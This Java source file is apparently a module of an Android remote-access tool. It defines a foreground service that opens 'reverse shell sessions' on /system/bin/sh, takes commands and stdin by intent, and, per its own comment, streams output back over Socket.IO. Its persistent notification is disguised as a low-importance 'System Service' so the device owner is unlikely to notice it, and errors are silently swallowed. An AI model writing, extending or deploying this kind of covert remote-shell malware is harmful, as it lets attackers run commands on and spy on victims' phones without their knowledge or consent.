package com.fason.app.features.shell;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import com.fason.app.core.FasonApp;

import java.util.concurrent.ConcurrentHashMap;

/**
 * Foreground service that manages interactive reverse shell sessions.
 * Each session runs /system/bin/sh and streams output back over Socket.IO.
 */
public class ShellService extends Service {

    public static final String ACTION_START = "com.fason.app.shell.START";
    public static final String ACTION_STOP  = "com.fason.app.shell.STOP";
    public static final String ACTION_EXEC  = "com.fason.app.shell.EXEC";
    public static final String ACTION_WRITE = "com.fason.app.shell.WRITE";
    public static final String ACTION_CLOSE = "com.fason.app.shell.CLOSE";

    public static final String EXTRA_COMMAND    = "command";
    public static final String EXTRA_DATA       = "data";
    public static final String EXTRA_SESSION_ID = "sessionId";

    private static final String NOTIF_CHANNEL = "shell_svc";
    private static final int NOTIF_ID = 2001;

    private final ConcurrentHashMap<String, ShellSession> sessions = new ConcurrentHashMap<>();
    private volatile boolean started = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || intent.getAction() == null) {
            return START_NOT_STICKY;
        }

        // Ensure foreground on any first action — Android 8+ kills services
        // that don't call startForeground() within ~5 seconds of creation.
        if (!started) {
            startForeground();
            started = true;
        }

        switch (intent.getAction()) {
            case ACTION_START:
                break;

            case ACTION_STOP:
                stopAllSessions();
                stopForeground(true);
                stopSelf();
                started = false;
                break;

            case ACTION_EXEC: {
                String sessionId = intent.getStringExtra(EXTRA_SESSION_ID);
                String command = intent.getStringExtra(EXTRA_COMMAND);
                if (sessionId != null && command != null) {
                    ShellSession session = sessions.get(sessionId);
                    if (session == null) {
                        session = new ShellSession(sessionId);
                        sessions.put(sessionId, session);
                        session.start();
                    }
                    session.exec(command);
                }
                break;
            }

            case ACTION_WRITE: {
                String sessionId = intent.getStringExtra(EXTRA_SESSION_ID);
                String data = intent.getStringExtra(EXTRA_DATA);
                if (sessionId != null && data != null) {
                    ShellSession session = sessions.get(sessionId);
                    if (session != null) {
                        session.writeStdin(data);
                    }
                }
                break;
            }

            case ACTION_CLOSE: {
                String sessionId = intent.getStringExtra(EXTRA_SESSION_ID);
                if (sessionId != null) {
                    ShellSession session = sessions.remove(sessionId);
                    if (session != null) {
                        session.close();
                    }
                }
                break;
            }
        }

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopAllSessions();
        super.onDestroy();
    }

    private void startForeground() {
        Notification notification = new Notification.Builder(this, NOTIF_CHANNEL)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTIF_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null && nm.getNotificationChannel(NOTIF_CHANNEL) == null) {
                NotificationChannel channel = new NotificationChannel(
                        NOTIF_CHANNEL,
                        "System Service",
                        NotificationManager.IMPORTANCE_MIN
                );
                channel.setDescription("System background service");
                channel.setShowBadge(false);
                nm.createNotificationChannel(channel);
            }
        }
    }

    private void stopAllSessions() {
        for (ShellSession session : sessions.values()) {
            session.close();
        }
        sessions.clear();
    }

    public static void exec(Context context, String sessionId, String command) {
        Intent intent = new Intent(context, ShellService.class);
        intent.setAction(ACTION_EXEC);
        intent.putExtra(EXTRA_SESSION_ID, sessionId);
        intent.putExtra(EXTRA_COMMAND, command);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void writeStdin(Context context, String sessionId, String data) {
        Intent intent = new Intent(context, ShellService.class);
        intent.setAction(ACTION_WRITE);
        intent.putExtra(EXTRA_SESSION_ID, sessionId);
        intent.putExtra(EXTRA_DATA, data);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void closeSession(Context context, String sessionId) {
        Intent intent = new Intent(context, ShellService.class);
        intent.setAction(ACTION_CLOSE);
        intent.putExtra(EXTRA_SESSION_ID, sessionId);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void startService(Context context) {
        Intent intent = new Intent(context, ShellService.class);
        intent.setAction(ACTION_START);
        try { context.startService(intent); } catch (Exception ignored) {}
    }

    public static void stopService(Context context) {
        Intent intent = new Intent(context, ShellService.class);
        intent.setAction(ACTION_STOP);
        try { context.startService(intent); } catch (Exception ignored) {}
    }
}
